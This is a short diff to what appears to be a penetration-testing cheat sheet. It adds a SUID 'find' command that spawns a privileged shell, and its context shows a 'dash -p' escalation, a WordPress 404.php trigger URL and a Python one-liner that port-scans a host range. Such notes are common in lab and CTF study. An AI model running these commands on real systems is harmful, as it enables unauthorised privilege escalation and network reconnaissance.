@@ -62,6 +62,7 @@ Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
 Binaries
 ```
 /usr/bin/dash -p
+Path: /usr/bin/find. Exp: find . -exec /bin/sh -p \; -quit
 ```
 
 LinPEAS
@@ -75,4 +76,6 @@ One-liner
 ```
 python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("[RANGE]").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]' 
 ```
+
+
 
